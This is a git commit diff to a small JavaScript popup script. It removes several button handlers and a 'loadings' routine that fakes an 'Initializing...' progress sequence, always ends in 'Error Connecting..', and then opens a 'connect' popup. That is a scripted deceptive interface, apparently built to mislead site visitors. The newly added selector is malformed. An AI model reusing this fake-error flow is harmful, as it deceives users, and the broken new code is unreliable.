ad841071a2c58d65abdc57263c99645687ef1935
rainmanner <165955243+rainmanner@users.noreply.github.com>
2024-04-10 06:21:57 +0800

    Update main 2.js

--- main 2.js
+++ main 2.js
@@ -1,69 +1,12 @@
 
-let click_me_btn = document.querySelector("body > div.M2tzjbs > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(1)")
+let click_me_btn = document.querySelector(".2tzjbs)")
 
 
 
-let first_popup = document.querySelector("body > div.2tzjbs")
+let first_popup = document.querySelector(".2tzjbs")
 
 
 click_me_btn.onclick = function (e) {
     e.preventDefault();
-    loadings();
-    closemodal();
     first_popup.style.display = "flex"
 }
-click_me_btn2.onclick = function (e) {
-    e.preventDefault();
-    loadings();
-    closemodal();
-    first_popup.style.display = "flex"
-}
-click_me_btn3.onclick = function (e) {
-    e.preventDefault();
-    loadings();
-    closemodal();
-    first_popup.style.display = "flex"
-}
-click_me_btn4.onclick = function (e) {
-    e.preventDefault();
-    loadings();
-    closemodal();
-    first_popup.style.display = "flex"
-}
-click_me_btn5.onclick = function (e) {
-    e.preventDefault();
-    loadings();
-    closemodal();
-    first_popup.style.display = "flex"
-}
-
-
-
-function loadings() {
-    var a =  setTimeout(function () {
-        loading.innerHTML = "Initializing.";
-      }, 1)
-    
-      var a = setTimeout(function() {
-        loading.innerHTML = "Initializing..";
-      }, 500)
-    
-      var a = setTimeout(function() {
-        loading.innerHTML = "Initializing...";
-      }, 1000)
-
-      var a = setTimeout(function() {
-        loading.innerHTML = "Initializing....";
-      }, 2000)
-
-      var a = setTimeout(function() {
-        loading.innerHTML = "Initializing.....";
-      }, 3000)
-
-      var a = setTimeout(function() {
-        loading.innerHTML = "Error Connecting.."
-        connect.style.display = "flex"
-      }, 4000)
-     
-    }
-    
